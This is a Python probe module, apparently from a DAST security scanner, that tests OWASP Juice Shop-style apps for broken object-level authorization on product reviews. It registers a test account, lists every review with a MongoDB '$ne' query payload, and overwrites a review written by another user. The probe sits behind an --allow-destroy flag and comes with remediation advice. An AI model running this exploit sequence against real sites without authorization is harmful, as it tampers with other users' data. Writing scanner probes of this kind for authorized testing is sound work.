#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization (BOLA): caller can edit another user's product review.

`PATCH /rest/products/reviews` updates a review by id without
verifying the calling JWT subject is the review's author. An attacker
locates any review id (the LIST endpoint returns them) and rewrites
the message at will.

Detection signal:
  Register user A, log in. Locate a review id NOT authored by A.
  PATCH /rest/products/reviews with `{"id": <foreign_review_id>,
  "message": <distinctive marker>}`. Server returns 200 with
  `modified: 1` (Mongo-style ack) → confirmed. We do NOT GET the
  review back, because the modification side-effect is its own proof
  and re-fetching gives no additional signal.

Note: this is intrinsically destructive — we ARE rewriting another
user's content. Off by default; require `--allow-destroy`. The probe
writes a marker the operator can find later and revert.

Tested against:
  + OWASP Juice Shop  PATCH accepted with modified:1 → validated=True
                      (when --allow-destroy passed).
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REVIEWS_GET  = "/rest/products/reviews?id[$ne]=-1"   # MongoDB-shape get-all
REVIEWS_PATH = "/rest/products/reviews"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"review-edit-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_email": email}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
        except json.JSONDecodeError:
            pass
    return out


def _find_foreign_review(client: SafeClient, origin: str,
                         token: str, own_email: str) -> dict | None:
    r = client.request("GET", urljoin(origin, REVIEWS_GET), headers={
        "Authorization": f"Bearer {token}",
    })
    if r.status != 200 or not r.body:
        return None
    try:
        doc = json.loads(r.text)
    except json.JSONDecodeError:
        return None
    rows = doc.get("data") if isinstance(doc, dict) else None
    if not isinstance(rows, list):
        return None
    for row in rows:
        if not isinstance(row, dict):
            continue
        author = row.get("author") or row.get("Author") or row.get("email")
        rid = row.get("_id") or row.get("id")
        if rid and author and author != own_email:
            return {"id": rid, "author": author}
    return None


class ProductReviewEditProbe(Probe):
    name = "authz_product_review_edit"
    summary = ("Detects PATCH /rest/products/reviews accepting edits "
               "to reviews authored by other users.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — the probe rewrites another user's review.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: this probe rewrites a review row. "
                         "Re-run with --allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        target = _find_foreign_review(client, origin, token,
                                       sess["user_email"])
        if not target:
            return Verdict(
                validated=False, confidence=0.6,
                summary=("Inconclusive: could not locate a foreign "
                         "review on the target — list endpoint empty "
                         "or unparsable."),
                evidence={"origin": origin},
            )

        marker = f"DAST probe rewrite — please ignore [{secrets.token_hex(4)}]"
        body = json.dumps({"id": target["id"], "message": marker}).encode()
        r = client.request("PATCH", urljoin(origin, REVIEWS_PATH),
                           headers={"Authorization": f"Bearer {token}",
                                    "Content-Type": "application/json"},
                           body=body)
        attempt = {"target_id": target["id"], "target_author": target["author"],
                   "status": r.status, "size": r.size,
                   "body_excerpt": (r.text or "")[:200]}
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "marker": marker, "attempt": attempt}

        confirmed = False
        if r.status == 200 and r.body:
            try:
                doc = json.loads(r.text)
                # Mongo-style ack uses {modified: 1}; some apps wrap as
                # {nModified: 1} or {result:{nModified:1}}.
                acked = (doc.get("modified") == 1
                         or doc.get("nModified") == 1
                         or (isinstance(doc.get("result"), dict)
                             and (doc["result"].get("nModified") == 1
                                  or doc["result"].get("modifiedCount") == 1)))
                if acked:
                    confirmed = True
                    attempt["modify_acked"] = True
            except json.JSONDecodeError:
                pass

        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: PATCH {origin}{REVIEWS_PATH} "
                         f"rewrote a review (id={target['id']}, "
                         f"author={target['author']}) authored by a "
                         "different user. Server reported the update "
                         "as acknowledged."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Verify that `req.user.email == review.author` "
                    "before applying the patch. The server should "
                    "either silently no-op (returning modified:0) or "
                    "respond 403 when the caller is not the author."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: PATCH on a foreign review at {origin} "
                     "did not produce an acknowledged modification."),
            evidence=evidence,
        )


if __name__ == "__main__":
    ProductReviewEditProbe().main()
